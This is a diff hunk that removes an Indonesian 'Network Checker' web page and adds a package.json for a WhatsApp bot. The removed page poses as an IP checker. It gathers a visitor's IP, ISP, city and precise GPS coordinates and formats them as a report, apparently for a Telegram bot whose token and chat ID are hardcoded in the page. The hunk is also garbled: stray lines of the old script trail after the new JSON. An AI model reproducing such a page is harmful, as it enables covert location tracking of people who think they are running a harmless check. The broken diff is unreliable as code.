@@ -1,69 +1,18 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Jaringan</title>
-    <style>
-        body { font-family: sans-serif; background: #0b0e14; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #151921; padding: 25px; border-radius: 15px; text-align: center; width: 90%; max-width: 350px; border: 1px solid #2d333b; }
-        input { width: 85%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #2d333b; background: #0b0e14; color: white; }
-        button { background: #238636; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 15px; font-size: 13px; color: #8b949e; }
-    </style>
-</head>
-<body>
-
-<div class="card">
-    <h2>Network Checker</h2>
-    <p>Masukkan IP atau biarkan kosong untuk cek IP sendiri</p>
-    <input type="text" id="ipInput" placeholder="Contoh: 180.244.xxx.xxx">
-    <button onclick="lacak()">MULAI PROSES</button>
-    <p id="status">Status: Standby</p>
-</div>
-
-<script>
-    const TOKEN = '8684002005:AAFjJtbOpKla5LBoblqhZsNKWSTobULGMZg';
-    const CHAT_ID = '7576591520';
-
-    async function lacak() {
-        const input = document.getElementById('ipInput').value.trim();
-        const status = document.getElementById('status');
-        status.innerText = "⏳ Sedang memproses data...";
-
-        try {
-            // Jika input kosong, API akan mendeteksi IP pengakses otomatis
-            const target = input ? input : ""; 
-            const res = await fetch(`https://ipapi.co/${target}/json/`);
-            const data = await res.json();
-
-            if (data.error) {
-                status.innerText = "❌ IP Tidak Dikenal. Gunakan format: 8.8.8.8";
-                return;
-            }
-
-            status.innerText = "📍 IP Ditemukan. Meminta GPS...";
-
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                await kirim(data, pos.coords);
-                status.innerText = "✅ Berhasil! Data terkirim.";
-            }, async (err) => {
-                await kirim(data, null);
-                status.innerText = "⚠️ GPS Ditolak. Data IP dikirim.";
-            }, { enableHighAccuracy: true, timeout: 5000 });
-
-        } catch (e) {
-            status.innerText = "❌ Koneksi Gagal. Coba lagi.";
-        }
-    }
-
-    async function kirim(d, c) {
-        let msg = `<b>🔔 LAPORAN MASUK</b>\n\n`;
-        msg += `<b>🌐 IP:</b> <code>${d.ip}</code>\n`;
-        msg += `<b>🏢 ISP:</b> ${d.org}\n`;
-        msg += `<b>📍 Lokasi:</b> ${d.city}, ${d.region}, ${d.country_name}\n`;
-        
-        if (c) {
+{
+  "name": "xyfur-super-bot",
+  "version": "1.0.0",
+  "description": "Bot WhatsApp Multifungsi",
+  "main": "index.js",
+  "scripts": {
+    "start": "node index.js"
+  },
+  "dependencies": {
+    "@whiskeysockets/baileys": "latest",
+    "qrcode-terminal": "latest",
+    "pino": "latest",
+    "axios": "latest"
+  }
+}
             msg += `\n<b>🎯 GPS PRESISI:</b>\n`;
             msg += `<a href="https://www.google.com/maps?q=${c.latitude},${c.longitude}">📍 KLIK LIHAT PETA</a>`;
         } else {
